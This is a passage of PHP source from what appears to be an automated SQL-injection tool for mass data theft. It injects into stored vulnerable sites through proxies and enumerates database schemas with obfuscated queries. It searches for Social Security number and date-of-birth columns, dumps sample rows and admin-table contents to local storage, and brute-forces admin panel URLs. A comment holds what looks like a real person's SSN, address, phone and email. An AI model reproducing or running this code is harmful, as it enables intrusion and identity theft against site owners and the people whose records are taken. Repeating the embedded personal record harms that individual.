			$set = $squle[0]['posts']['sleep'];
			$this->d($set,'pass SET SOL');
		}else
		{
			$set = false;
		}
		
		
		
		$this->mysqlInj->inject($squle[0]['posts']['header'].'::'.$squle[0]['posts']['gurl'],$squle[0],$set);
		
		$bd = explode(':', $field['Filed']['ipbase']);

		$password=':';
		
		foreach ($pass as $pps)
		{

		
		
			$this->workup();
			
			
			if($this->mysqlInj->mssql==true){
				
				$bd_new =  $bd[1];
				
					
				$pps = $this->mysqlInj->charcher_mssql("%$pps%");
				$table_new = $this->mysqlInj->charcher_mssql($bd[2]);
				
				$mysql = $this->mysqlInj->mssqlGetValue("(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from $bd_new.information_schema.columns where table_name ={$table_new} AND column_name like $pps order BY column_name  ASC) sq order BY column_name ASC)");
				
				$mysql['COLUMN_NAME'] = $mysql["(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from $bd_new.information_schema.columns where table_name ={$table_new} AND column_name like $pps order BY column_name  ASC) sq order BY column_name ASC)"];
				
			}else{
			
				$mysql = $this->mysqlInj->mysqlGetValue('information_schema','COLUMNS', 'COLUMN_NAME', 0,array(),' WHERE `TABLE_NAME`=char('.$this->charcher($bd[2]).') AND `TABLE_SCHEMA`=char('.$this->charcher($bd[1]).') AND `COLUMN_NAME` LIKE char('.$this->charcher('%'.$pps.'%').')');
			}
			if(isset($mysql['COLUMN_NAME']))
			{
				$password.= ''.$mysql['COLUMN_NAME'];
				continue;
			}
			
		}

		$this->Filed->query('UPDATE  `fileds` SET  `salt` =  "'.$password.'" WHERE  `id` ='.$idf);

	}
	
	
	///ПОИСК SSN///
	
	function getCountSsn(){ //поиск колонок с SNN у --MYSQL--
		
		
		
		if($this->ssn_check==false)return false;
		
		
		//483134866;MELISSA A GAMERDINGER;USA;5616 SIERRA DRIVE ;WATERLOO;IA;50701;3192699956;1980-10-07;miffi656@msn.com 
		
		$this->timeStart = $this->start('getCountSsn',1);
		
		
		
		//exit;
		
		
		//$poles = $this->Post->query("SELECT * FROM `posts` WHERE `order_check` =0 ORDER by  id limit 1");
		
		$poles = $this->Post->query("SELECT * FROM `posts` WHERE `status`=3 AND `prohod`=5 AND `ssn_check` =0 AND `version` LIKE  '%5.%'  limit 15");
		//$poles = $this->Post->query("SELECT * FROM `posts` WHERE `id`=1333641  limit 1");
		//1333641
		
		if(count($poles)>0)
		{
			$this->d('netuuuuuuu');
           
		}else
		{    $this->ssn_16();
			$this->stop();
			die();
		}
		
		$r = rand(1,100);
		
		
		
		foreach ($poles as $pole)
		{
			$this->workup();
            $this->Filed->query('UPDATE  `posts` SET  `ssn_check` =  1 WHERE  `id` ='.$pole['posts']['id']);
            
			$this->FindCountSsnOne($pole['posts']['id']);
			$this->tableOrder = '';
            $this->workup();
			
			
		}
		
        
        $this->ssn_16();
        
		$this->stop();
		
		die('fse');
		
	}
	
	function FindCountSsnOne ($idf){
		$this->d('FindCountOrderOne - zapusk');
		
		$pass = $this->ssn_dob;
		
		$squle = $this->Post->query("SELECT * FROM `posts` WHERE id=".$idf.' limit 1');
		$squle = $squle[0];
		$this->d($squle,'squle');
		
		
		$post_id = $squle['posts']['id'];
		$domen = $squle['posts']['domen'];
		
		//$field = $this->Filed->query("SELECT * FROM  `fileds` WHERE `post_id` = ".$squle['posts']['id']);
		//$this->d($field,'field');
		
		
		$this->workup();
		
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		
		

		
		
		if(strlen($squle['posts']['sleep']) > 2)
		{
			$set = $squle['posts']['sleep'];
			$this->d($set,'pass SET');
		}else
		{
			$set = false;
		}
		
		
		$this->mysqlInj->inject($squle['posts']['header'].'::'.$squle['posts']['gurl'],$squle,$set);
		
		
		//	$this->d($this->mysqlInj);
		
		
		
		$password='';
		$i=1;
		
		$this->d($pass);
		
		
		foreach ($pass as $pps)
		{
			$pss = trim($pps);
			
			//$this->d('ishem - '.$pps);
			
			$this->workup();
			 
			//$pps ='cc_number';
			
			$mysql_all = $this->mysqlInj->mysqlGetAllValue('information_schema','COLUMNS',array('COLUMN_NAME','TABLE_NAME','TABLE_SCHEMA'),0,array(),'WHERE `COLUMN_NAME` LIKE char('.$this->charcher('%'.$pps.'%').') AND ( DATA_TYPE=char('.$this->charcher('char').') OR DATA_TYPE=char('.$this->charcher('varchar').') OR DATA_TYPE=char('.$this->charcher('text').'))');
			
			$this->d($mysql_all,'mysql ALLLLL');
			//exit;
			
			if(isset($mysql_all) AND count($mysql_all) >0)
			{
				
				foreach($mysql_all as $mysql)
				{
					

					
					if(isset($mysql['COLUMN_NAME']) AND $mysql['COLUMN_NAME'] !=null AND $mysql['COLUMN_NAME'] !='null')
					{
						
						
						
						//if(in_array($mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME'].'/'.$mysql['COLUMN_NAME'],$this->card_dubles)){
						
						//$this->d($this->card_dubles,'kuuuuuuuuu DUBLES');
						//continue;
						//}
						
						$this->card_dubles[] = $mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME'].'/'.$mysql['COLUMN_NAME'];
						
						
						$bd = $mysql['TABLE_SCHEMA'];
						$table = $mysql['TABLE_NAME'];
						$column = $mysql['COLUMN_NAME'];
						
						$this->tableOrder = $table;
						
						
						
						
						
						
						$card.= ' '.$mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME'].'/'.$mysql['COLUMN_NAME'];
						$card_one = $mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME'].'/'.$mysql['COLUMN_NAME'];
						
						
						

						$count_table = $this->mysqlInj->mysqlGetCountInsert($bd,$table);
						
						if($count_table > 30)
						{
							
							
							
							$count_table2 = "<span style='color:red; font-size:13px;font-weight:700;'>".$count_table."</span>";	
							$card_one2 = $mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME']."({$count_table2})/".$mysql['COLUMN_NAME'];
							$card_one_count = $mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME']."({$count_table})/".$mysql['COLUMN_NAME'];
							$this->d($card_one2,'!!');
							$data['orders'][] = $card_one2;
							
							$uniq = $this->Post->query("SELECT * FROM `ssn` WHERE `bd`='{$bd}' AND `table`='{$table}' AND `column`='{$column}' limit 1");
							$count = count($uniq);
							
							$this->d($count,'count');
							
							if($count ==0)
							{
								
								$date = date('Y-m-d h:i:s');	
								
								if($this->Post->query("INSERT INTO ssn (
								`post_id`,
								`bd`,
								`table`,
								`column`,
								`count`,
								`card2`,
								`domen`,
								`date`) 
								
								VALUES(
								{$post_id},
								'{$bd}',
								'{$table}',
								'{$column}',
								{$count_table},
								'{$card_one_count}',
								'{$domen}',
								'{$date}')")){
									
									$this->d('v bd uspeshno vstavleno');
									
								}
							}else
							{
								$this->d("SELECT * FROM `ssn` WHERE `bd`='{$bd}' AND `table`='{$table}' AND `column`='{$column}' limit 1",'EST D BD!!!');
								echo mysql_error();
							}
							//}
						}else{
							
							
							$this->d('menshe 20 !!!!!!',$count_table);
						}
					}
					///exit;
					//exit;
					//sleep(1);
				}
			}else
			{
				$this->d($pps,'nuhya netu');
			}
			//exit;
		}
		

		
	}
	
	
	
	function getCountSsnMSSQL(){ //поиск колонок с SNN у ++MSSQL++
		
		$this->timeStart = $this->start('getCountSnnMSSQL',1);
		
		
		
		//exit;
		
		
		//$poles = $this->Post->query("SELECT * FROM `posts` WHERE `order_check` =0 ORDER by  id limit 1");
		
		$poles = $this->Post->query("SELECT * FROM `posts` WHERE `status`=3 AND `prohod`=5 AND `ssn_check` =0 AND `version` LIKE  'M%' limit 7");
		//$poles = $this->Post->query("SELECT * FROM `posts` WHERE `id`=1333641  limit 1");
		//1333641
		
		if(count($poles)>0)
		{
			$this->d('netuuuuuuu');
		}else
		{
			$this->stop();
			die();
		}
		
		$r = rand(1,100);
		
		
		
		foreach ($poles as $pole)
		{
			$this->workup();
            $this->Filed->query('UPDATE  `posts` SET  `ssn_check` =  1 WHERE  `id` ='.$pole['posts']['id']);
			$this->FindCountSsnOneMSSQL($pole['posts']['id']);
			$this->tableOrder = '';
			
			
		}
		
		$this->stop();
		
		die('fse');
		
	}
	
	function FindCountSsnOneMSSQL ($idf){
		$this->d('FindCountSsnOneMSSQL - zapusk');
		
		$pass = $this->ssn_dob;
		
		$squle = $this->Post->query("SELECT * FROM `posts` WHERE id=".$idf.' limit 1');
		$squle = $squle[0];
		$this->d($squle,'squle');
		
		
		$post_id = $squle['posts']['id'];
		$domen = $squle['posts']['domen'];
		
		//$field = $this->Filed->query("SELECT * FROM  `fileds` WHERE `post_id` = ".$squle['posts']['id']);
		//$this->d($field,'field');
		
		
		$this->workup();
		
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		
		if(preg_match("/microsoft/i",$squle[0]['posts']['version']))
		{
			$this->mysqlInj->mssql =true;
			
			$this->d('MSSQL!');
			
		}

		
		
		if(strlen($squle['posts']['sleep']) > 2)
		{
			$set = $squle['posts']['sleep'];
			$this->d($set,'pass SET');
		}else
		{
			$set = false;
		}
		
		
		$this->mysqlInj->inject($squle['posts']['header'].'::'.$squle['posts']['gurl'],$squle,$set);
		
		
		//	$this->d($this->mysqlInj);
		
		
		
			$password='';
			$i=1;
			
			$this->d($pass);
		
	
		
			$data = $this->mysqlInj ->mssqlGetLikeSsn();
			
		
			$this->d($data,'data T');
			
			//exit;
			if(count($data)>0)
			{
				$this->workup();
				$url = parse_url($squle['Post']['url']);
				$ip = gethostbyname($url['host']);

				foreach ($data as $key => $value)
				{
						
						
					//$this->d($mail,'$mail');
					$mail2 = explode(':::',$value);
					$mail['TABLE_SCHEMA'] = $mail2[0];
					$mail['TABLE_NAME'] = $mail2[1];
					$mail['COLUMN_NAME'] = $mail2[2];
					
					$mailcount = $this->mysqlInj->mssqlGetCount($mail['TABLE_SCHEMA'],$mail['TABLE_NAME']);
					
					
					$this->d($mailcount,'$mailcount');
					//exit;
						
				
				
				
					$this->workup();
				
				
					
					
					if(intval($mailcount)!==0 and $mailcount > 20)
					{
						
							
								
								
					
						$this->card_dubles[] = $mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME'].'/'.$mysql['COLUMN_NAME'];
						
						
						$bd = $mysql['TABLE_SCHEMA'];
						$table = $mysql['TABLE_NAME'];
						$column = $mysql['COLUMN_NAME'];
						
						$this->tableOrder = $table;
						

						$card.= ' '.$mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME'].'/'.$mysql['COLUMN_NAME'];
						$card_one = $mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME'].'/'.$mysql['COLUMN_NAME'];
						

						$count_table = $mailcount;
						
						
						$count_table2 = "<span style='color:red; font-size:13px;font-weight:700;'>".$count_table."</span>";	
						$card_one2 = $mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME']."({$count_table2})/".$mysql['COLUMN_NAME'];
						$card_one_count = $mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME']."({$count_table})/".$mysql['COLUMN_NAME'];
						$this->d($card_one2,'!!');
						$data['orders'][] = $card_one2;
						
						$uniq = $this->Post->query("SELECT * FROM `ssn` WHERE `bd`='{$bd}' AND `table`='{$table}' AND `column`='{$column}' limit 1");
						$count = count($uniq);
						
						$this->d($count,'count');
						
						if($count ==0)
						{
							
							$date = date('Y-m-d h:i:s');	
							
							if($this->Post->query("INSERT INTO ssn (
							`post_id`,
							`bd`,
							`table`,
							`column`,
							`count`,
							`card2`,
							`domen`,
							`date`,
							`typedb`) 
							
							VALUES(
							{$post_id},
							'{$bd}',
							'{$table}',
							'{$column}',
							{$count_table},
							'{$card_one_count}',
							'{$domen}',
							'{$date}',
							'mssql')")){
								
								$this->d('v bd uspeshno vstavleno');
								
							}
						}else
						{
							$this->d("SELECT * FROM `ssn` WHERE `bd`='{$bd}' AND `table`='{$table}' AND `column`='{$column}' limit 1",'EST D BD!!!');
						}
					}else
					{
						$this->d($pps,'nuhya netu');
					}
					//exit;
			
				}

			
			}
		
	
	
	}
	
	
	
	///ПОИСК SSN - допольнительные функции///
	
	function ssn_16(){//ssn_card  пишем сюда последние 10 значений
		
		
		
		
		$poles = $this->Post->query("SELECT * FROM `ssn` WHERE `count_n` ='0'  ORDER by count  limit 6");
		
		$this->d($poles,'poles');
		
		
		
		$this->timeStart = $this->start('ssn_16',1);
		
		if(count($poles)>0)
		{
			
		}else
		{
			$this->stop();
			die();
		}
		
		
		
		foreach ($poles as $pole)
		{
			$id = $pole['ssn']['id'];
			$bd = $pole['ssn']['bd'];
			$table = $pole['ssn']['table'];
			$column = $pole['ssn']['column'];
			$count = $pole['ssn']['count'];
			$this->workup();
			
            $this->Filed->query('UPDATE  `ssn` SET  `count_n` = 1  WHERE  `id` ='.$id);
            
            
			$this->ssn_16_one($id,$pole['ssn']['post_id'],$bd,$table,$column,$count);
			
		}
		
		$this->stop();
		
		die('fse');
		
	}
	
	function ssn_16_one($id,$post_id,$bd,$table,$column,$count){
		
		
		$this->d('count_16_ssn_one - zapusk');
		
		$pass = $this->ssn_dob;
		
		
		$squle = $this->Post->query("SELECT * FROM `posts` WHERE id=".$post_id.' limit 1');
		$squle = $squle[0];
		$this->d($squle,'squle');
		
		if($squle['posts']['ssn']=='::')
		{
			
			$password = " $bd/$table/$column";
			$this->d($password,'$password');
			$this->Filed->query('UPDATE  `posts` SET  `ssn` =  "'.$password.'" WHERE  `id` ='.$post_id);
			
		}
		
		
		
		$post_id = $squle['posts']['id'];
		$order_id = $id;
		$domen = $squle['posts']['domen'];
		
		
		
		
		//$field = $this->Filed->query("SELECT * FROM  `fileds` WHERE `post_id` = ".$squle['posts']['id']);
		
		
		$this->workup();
		
		$this->mysqlInj = new $this->Injector();
		
		$this->proxyCheck();
		
		if(strlen($squle['posts']['sleep']) > 2)
		{
			$set = $squle['posts']['sleep'];
			$this->d($set,'pass SET');
		}else
		{
			$set = false;
		}
		
		
		$this->mysqlInj->inject($squle['posts']['header'].'::'.$squle['posts']['gurl'],$squle,$set);
		
		$column_all = $this->mysqlInj->mysqlGetFieldByTable($bd,$table);
		
	
			$this->d($column_all,'$column_all');


		if(count($column_all) > 2 AND $column_all !='')
		{
			
			$column_all_srt='';
			
			foreach($column_all as $col)
			{
				$col_str = '';
				$ccc[] = trim($col);
				
				
					
			}
			
			
			$col_str = implode(';',$ccc);
			
			$this->d($col_str,'$col_str');
			
			$this->Post->query("INSERT INTO ssn_card (`order_id`,`data`) VALUES({$order_id},'".$col_str."')");
			$l = rand(1,500);
			
			
			
			
			for($i=$l;$i<$l+20;$i++)
			{
			
				$kuku = array();
			
				$kuku =  $this->mysqlInj->mysqlGetValue($bd,$table,$ccc,$i,array(),'');
				
				
				//$this->d($kuku,'kuku');
				//exit;
				
				$str = '';
				if(count($kuku) >1 and  $kuku !='')
				{
						foreach($kuku as $yyy)
						{
							if($yyy !='')$str .= $yyy.';';
						}

				}
					
					
					
					//$this->d($str,'$str222');
					
					
					if($str !='')
					{
						$this->d($str,'$str');
						
						$this->Post->query("INSERT INTO ssn_card (`order_id`,`data`) VALUES({$order_id},'$str')");
					
						$this->d("INSERT INTO ssn_card (`order_id`,`data`) VALUES({$order_id},'$str')");
						
					}
					
					
			}
				

		} 
		

		
		
		
		//$this->d($g,"UPDATE  `ssn` SET  `count_n` = 1  WHERE  `bd` ='$bd' AND `table`='$table'");
		
		//if($g>=2)
		//{
			//$this->Filed->query("UPDATE  `ssn` SET  `count_n` = 1  WHERE  `bd` ='$bd' AND `table`='$table'");
			
		//}
		

		
	}
		
	
	
    
    
    //поиск админов	
	function download_admin(){
        
        $ip = '';
        
        exec("tar -cvf /full/path/to/filename.tar.gz folder_to_archive/");
    }
	
	function getCountAdmin(){ //поиск таблиц с админами по списку
			
			$this->timeStart = $this->start('getCountAdminDB',1);
			
			
            
            	$ret =$this->Post->query("show columns FROM `posts` where `Field` = 'table_admin_check'");
		if($ret[0]['COLUMNS']['Field']=='table_admin_check'){
			//$this->d($ret,'FILED table_admin_check good');
		}else{
			$this->d('mysqlbd posts no, sozdaem posts');
			$this->Post->query("ALTER TABLE posts ADD table_admin_check int(0) NOT NULL ");
		}

            
			
			//exit;
			
			
			//$poles = $this->Post->query("SELECT * FROM `posts` WHERE `order_check` =0 ORDER by  id limit 1");
			
			$poles = $this->Post->query("SELECT * FROM `posts` WHERE `status`=3 AND `table_admin_check` =0 limit 5");
			//$poles = $this->Post->query("SELECT * FROM `posts` WHERE `id`=3  limit 1");
			//1333641
			
			if(count($poles)>0)
			{
				
			}else
			{
				$this->d('netuuuuuuu');
				$this->stop();
				die();
			}
			
			$r = rand(1,100);
			
			
			
			foreach ($poles as $pole)
			{
				$this->d($pole,'pole');
				flush();
				
				$this->workup();
				$this->Filed->query('UPDATE  `posts` SET  `table_admin_check` =  1 WHERE  `id` ='.$pole['posts']['id']);
				$this->FindcountAdmin($pole['posts']['id']);
				
				
			
				$this->tableOrder = '';
				
				
			}
			
			$this->stop();
			
			die('fse');
			
		}
		
	function FindcountAdmin ($idf){
			$this->d('FindcountAdmin - zapusk');
			
			$pass = $this->search_admins;
			
			$squle = $this->Post->query("SELECT * FROM `posts` WHERE id=".$idf.' limit 1');
			
			$this->d("SELECT * FROM `posts` WHERE id=".$idf.' limit 1');
			$squle = $squle[0]; 
		
            $this->d($squle,'$squle');	
		
			
			$post_id = $squle['posts']['id'];
			$domen = $squle['posts']['domen'];
			
			//$field = $this->Filed->query("SELECT * FROM  `fileds` WHERE `post_id` = ".$squle['posts']['id']);
		
			
			
			$this->workup();
			
			$this->mysqlInj = new $this->Injector();
			$this->proxyCheck();
			
			

			
			
			if(strlen($squle['posts']['sleep']) > 2)
			{
				$set = $squle['posts']['sleep'];
				$this->d($set,'pass SET');
			}else
			{
				$set = false;
			}
			
			
			$this->mysqlInj->inject($squle['posts']['header'].'::'.$squle['posts']['gurl'],$squle,$set);
			
			
			//	$this->d($this->mysqlInj);
			
			
			
			$password='';
			$i=1;
			
			$this->d($pass);
			$time = time();
			
			foreach ($pass as $pps)
			{
				$mysql_all = array();
				
				$new = time();
				$razn = $new-$time;
				$this->d($razn,'razn');
				
				if($razn>225)
				{
					$this->d($razn.'-raz norders po vremeni > 25:'.$this->r);
				
					return 'vpizdu';
				}
				
				$time = time();
				
				
				
				
				$pss = trim($pps);
				
				//$this->d('ishem - '.$pps);
				
				$this->workup();
				
				//$pps ='cc_number';
				
				$mysql_all = $this->mysqlInj->mysqlGetAllValue('information_schema','TABLES',array('TABLE_NAME','TABLE_SCHEMA'),0,array(),'WHERE `TABLE_NAME` LIKE char('.$this->charcher('%'.$pps.'%').')');
				
				$this->d($mysql_all,'mysql ALLLLL');
				//exit;
				
				if(isset($mysql_all) AND count($mysql_all) >0 AND $mysql_all !=0)
				{
					
					foreach($mysql_all as $mysql)
					{
						$this->workup();
						$new = time();
						$razn = $new-$time;
						$this->d($razn,'razn2');
						
						if($razn>225)
						{
							$this->d($razn.'-raz norders po vremeni > 25:'.$this->r);
						
							return 'vpizdu';
						}
						
						$time = time();
						
                        if(in_array($mysql['TABLE_NAME'],$this->search_admin_stop_word)){
                            
                            
                            $this->d($mysql['TABLE_NAME'],'STOP TABLICA !!!');
                            
                            
                            continue;
                        }
                        
                        
						if(isset($mysql['TABLE_NAME']) AND $mysql['TABLE_NAME'] !=null AND $mysql['TABLE_NAME'] !='null')
						{
							
						
							$this->card_dubles[] = $mysql['TABLE_SCHEMA'].'/'.$mysql['TABLE_NAME'];
							
							
							$bd = $mysql['TABLE_SCHEMA'];
							$table = $mysql['TABLE_NAME'];
							
							$this->tableOrder = $table;
				
							
							//$mysql_columns = $this->mysqlInj->mysqlGetAllValue(
							//'information_schema','COLUMNS',array('COLUMN_NAME'),0,array(),"WHERE `TABLE_NAME`='$table' AND `TABLE_SCHEMA`='$bd'");
							
							
							
							//$this->d($mysql_columns,'$mysql_columns');
							//$k=0;
							
							//foreach($mysql_columns as $mm)
							//{
								
								//$gg[] = $mm['COLUMN_NAME'];	
								//$k++;
								
								
							//}
                            
                            
                            
							
							//array_splice($gg, 4);
							
							//$k=0;
							
							//$this->d($gg,'$gg');
							
							//$mysql_data = $this->mysqlInj->mysqlGetAllValue($bd,$table,$gg,0,array());
							

							//$this->d($mysql_data,'$mysql_data');
							
                            
                            $mysql_bd_table_columns = $this->mysqlInj->mysqlGetFieldByTable($bd,$table);
							$this->d($mysql_bd_table_columns,"mysql $bd $table");
								$col = array();
                                $mysql_result = array();
							
								if(count($mysql_bd_table_columns) >0)
								{
									$y=0;
									foreach($mysql_bd_table_columns as $ccc)
									{
										
										//fwrite($fh,$ccc.' ');
										//$text .= $ccc.';';
										
										$col[] = $ccc;
										$y++;
										if($y==25)break;
									}
								}
                                $y=0;
                               
                            
                            
                                
                                for($i=0;$i<5;$i++,$y++)
                                {
                                    
                                    $mysql_data =  $this->mysqlInj->mysqlGetValue($bd,$table,$col,$i,array(),'');
                                    
                                    $this->d($mysql_data,'$mysql_data');
                                      $out = array_keys($mysql_data);   
                                    
                                    
                                     if(trim($mysql_data[$out[0]])!='' AND count($mysql_data) >0)
                                        {   
                                    $ggg = implode(',',$col);
                                            $mysql_result[$bd.'/'.$table."/".$ggg] = $mysql_data;              
                                        }else
                                        {
                                          if($y==2)
                                          {
                                              
                                              break;
                                          }  
                                            
                                        }    
                                        
                                        
                                    //if(reset($kuku) !='')$mysql_result[] = $kuku;
                                   
                                    //$this->d(reset($kuku),'reset($kuku)');
                                    //$this->d(end($kuku),'end($kuku)');
                                    
                                    
                                   
                                    //exit;
                                }
                          
                            $this->d($mysql_result,'$mysql_result');
                            
                           // exit;
                           foreach($mysql_result as $bttb=>$mysql_data ) 
                           {
							
								
								$mm = implode(',',$mysql_data);
								$this->d($mm,'$mm');
									
									
								
							
								
								mkdir($_SERVER['DOCUMENT_ROOT']."/app/webroot/admins/{$domen}");
								
								
								
								$usp_tmp = $_SERVER['DOCUMENT_ROOT']."/app/webroot/admins/$domen/admin.txt";
								
			
									$ff2 = fopen (	$usp_tmp, "a+");
									fwrite($ff2,$bttb.':'."\r\n".$mm."\r\n\r\n\r\n");
									fclose();
								
                              
							
							
								
							
                            }
                        }
					}
				}else
				{
					$this->d($pps,'nuhya netu');
				}
			
			}
				
		}
	
    
    function getCountAdminPage(){ //поиск админок у сайтов
			
			$this->timeStart = $this->start('getCountAdminPage',$this->search_admin_count_par);
			
			
           

            
            
            
            	$ret =$this->Post->query("show columns FROM `posts` where `Field` = 'page_admin_check'");
		if($ret[0]['COLUMNS']['Field']=='page_admin_check'){
			//$this->d($ret,'FILED table_admin_check good');
		}else{
			$this->d('mysqlbd posts no, sozdaem posts');
			$this->Post->query("ALTER TABLE posts ADD page_admin_check int(0) NOT NULL ");
		}

            
			
			//exit;
			
			
			//$poles = $this->Post->query("SELECT * FROM `posts` WHERE `order_check` =0 ORDER by  id limit 1");
			
			$poles = $this->Post->query("SELECT * FROM `posts` WHERE `status`=3 AND `page_admin_check` =0 limit ".$this->search_admin_count);
			//$poles = $this->Post->query("SELECT * FROM `posts` WHERE `id`=3  limit 1");
			//1333641
			
			if(count($poles)>0)
			{
				
			}else
			{
				$this->d('netuuuuuuu');
				$this->stop();
				die();
			}
			
			$r = rand(1,100);
			
			
			
			foreach ($poles as $pole)
			{
				$this->d($pole,'pole');
				flush();
				
				$this->workup();
				$this->Filed->query('UPDATE  `posts` SET  `page_admin_check` =  1 WHERE  `id` ='.$pole['posts']['id']);
				$this->FindcountAdminPage($pole['posts']['id']);
				
				
			
				$this->tableOrder = '';
				
				
			}
			
			$this->stop();
			
			die('fse');
			
		}
	
    function FindcountAdminPage ($idf){
			//$this->d('FindcountAdminPage - zapusk');
			
			$pass = $this->search_admins;
			
			$squle = $this->Post->query("SELECT * FROM `posts` WHERE id=".$idf.' limit 1');
			
			$this->d("SELECT * FROM `posts` WHERE id=".$idf.' limit 1');
			$squle = $squle[0]; 
		
            $this->d($squle,'$squle');	
            $squle['posts']['http'] = trim($squle['posts']['http']);
        
        
        
        //$squle['posts']['http']='http';
     //  $squle['posts']['domen'] = 'hardwaredata.org';
			
			$post_id = $squle['posts']['id'];
			$domen = $squle['posts']['domen'];
            
            
            
			//$domen = 'https://www.devilinspired.com/blog/admin/';
          
           // exit;
          
			
		
		$hal_admin = file( $_SERVER['DOCUMENT_ROOT']."/app/webroot/ADMIN");
		
		
		$ip  = gethostbyname($domen);
		$ip = $squle['posts']['http'].'://'.$ip;
		
        
        $url2 =$squle['posts']['http'].'://admin.'.$domen;
     //$url2 =$squle['posts']['http'].'://admin.hardwaredata.org';
       
		$url = $squle['posts']['http'].'://'.$domen;
       
		 // $this->d($url,'$url');
          //exit;
		//$url = 'caribrecept.imingo.net/dealsdesiles/v2/';
		
		foreach ($hal_admin as $val)
        {
            
            $val = trim($val);
            
          
			$urls[] = $url.str_replace('//','/','/'.$val);
			$urls[] = $ip.str_replace('//','/','/'.$val);
            $urls[] = $url.str_replace('//','/','/'.$val);
		}
		
		//$this->d($urls,'zapusk poiska adminok');
		//exit;
		
		$cmh = curl_multi_init();
		$tasks = array();
		$i=0;
		
		$count_urls = count($urls);
		$this->d($count_urls,'$count_urls');
//exit;
		$file = 'adminpanel.txt';
		mkdir($_SERVER['DOCUMENT_ROOT']."/app/webroot/admins/{$domen}");
						
		$ff = $_SERVER['DOCUMENT_ROOT']."/app/webroot/admins/{$domen}/$file";
		
		$fp = fopen ($ff, "a+");
		$this->d($ff,'ff');
		
		for($i=0;$i<$count_urls;$i++)
		{
			
			
			$this->workup();
			//echo $i.' - i<br>';
			
			if($i==50 or count($urls) == 0)
			{
				//$this->d($i,'count->break'); 
				break;
			}
			
			$urlnew = array_shift($urls);
			
			$ch = $this->streampars($urlnew);
			
			
			$tasks[$urlnew] = $ch;
			curl_multi_add_handle($cmh, $ch);
			
		}
		
		
		//$this->d($tasks,'$tasks');
		
		$active = null;

		do 
		{
			$mrc = curl_multi_exec($cmh, $active);
		}
		while ($mrc == CURLM_CALL_MULTI_PERFORM);


		while ($active && ($mrc == CURLM_OK)) 
		{

			if (curl_multi_select($cmh) != -1) 
			{
                
                
                
                
				do 
				{
					
					$mrc = curl_multi_exec($cmh, $active);

					$info = curl_multi_info_read($cmh);

					if ($info['msg'] == CURLMSG_DONE) 
					{
						$ch = $info['handle'];
						
						$status=curl_getinfo($ch,CURLINFO_HTTP_CODE);
						
						$this->d($status,'status');
						
						//$this->d($ch,'ch');

						$url = array_search($ch, $tasks);
						$url = trim($url);
						

						
                        
                      
						
						if(($status == 200  OR $status == 403 OR $status ==302))
						{
							
                            
                           if($this->search_admin_find_content==true)
                           {
                               
                                $tasks[$url] = curl_multi_getcontent($ch);                    
                                
                                $content = $tasks[$url];
                                 
                             
                                 
                                //echo "<a target='_blank' href='{$url}'>$url - {$status} - POISK !!!</a><br>";
                                $kuku = 'yes';
                                //$this->d($url.' - $url OTVET GOOD ');
                             
                                
                                 
                                 foreach($this->search_admin_page_word as $fff)
                                 {
                                    $fff = trim($fff);    
                                     
                                    if(preg_match("/".$fff."/i",$content)) 
                                    {
                                        
                                         $this->d($url.' - '.$fff."\r\n",'11111111111'); 
                                        
                                        // $this->d($tasks[$url],'content'); 
                                        
                                        fwrite($fp,$url.' - '.$fff."\r\n");
                                        
                                        
                                    }
                                     
                                     
                                 }
                                 
                            }else
                            {
                                
                                // $this->d($tasks[$url],'content'); 
                               
                                echo "<a target='_blank' href='{$url}'>$url - {$status}</a><br>";
                                $kuku = 'yes';
                                //$this->d($url.' - $url OTVET GOOD ');
                                $url = trim($url);
                                fwrite($fp,$url."\r\n");
                               
                               
                           }
                            
						}
						
						
						
						//exit;
						
						//$url = explode(':::', $url);
						//$url['posts']['id'] =  $url[1];
						//$url['posts']['url'] = $url[0];
						
						//if($this->debug==true){$this->d($content,'$content');}
                        
                       // if($this->debug==true){$this->d($url,'$url$url$url$url');}
						
						//$url2 = $url[0];
						
						
						$url = explode(':::', $url);
						

						flush();

						curl_multi_remove_handle($cmh, $ch);

						curl_close($ch);
						
						
						
						if(count($urls)>0)
						{
							//echo 'zapusk dopolnitelno<br>';	
							
							$urlnew = array_shift($urls);
							
							
							
							$ch = $this->streampars($urlnew);	

							//	$this->d($ch);							
							$tasks[$urlnew] = $ch;
							curl_multi_add_handle($cmh, $ch);
						}
					}
					
					$this->workup();
					
				}
				while ($mrc == CURLM_CALL_MULTI_PERFORM);
			}
		}

		if($kuku !='yes'){
			
			$this->d('ne nashol admonku ');
		}

		curl_multi_close($cmh);

		
		
		
				
		}
	
    
    
	function findadmin(){//поиск админки у одного домена
	
		
       
        
        
        $ttt = parse_url($this->data['Post']['domen']);
        
        $this->d($ttt,'$ttt');
        //exit;
        
		$domen = $ttt['host'];
        
        $hal_admin = file( $_SERVER['DOCUMENT_ROOT']."/app/webroot/ADMIN");
		$squle['posts']['http'] = $ttt['scheme'];
		
		$ip  = gethostbyname($domen);
		$ip = $squle['posts']['http'].'://'.$ip;
		
        
        $url2 =$squle['posts']['http'].'://admin.'.$domen;
     //$url2 =$squle['posts']['http'].'://admin.hardwaredata.org';
       
		$url = $squle['posts']['http'].'://'.$domen;
       
		 // $this->d($url,'$url');
          //exit;
		//$url = 'caribrecept.imingo.net/dealsdesiles/v2/';
		
		foreach ($hal_admin as $val)
        {
            
            $val = trim($val);
            
          
			$urls[] = $url.str_replace('//','/','/'.$val);
			$urls[] = $ip.str_replace('//','/','/'.$val);
            $urls[] = $url.str_replace('//','/','/'.$val);
		}
		
		//$this->d($urls,'zapusk poiska adminok');
		//exit;
		
		$cmh = curl_multi_init();
		$tasks = array();
		$i=0;
		
		$count_urls = count($urls);
		$this->d($count_urls,'$count_urls');
//exit;
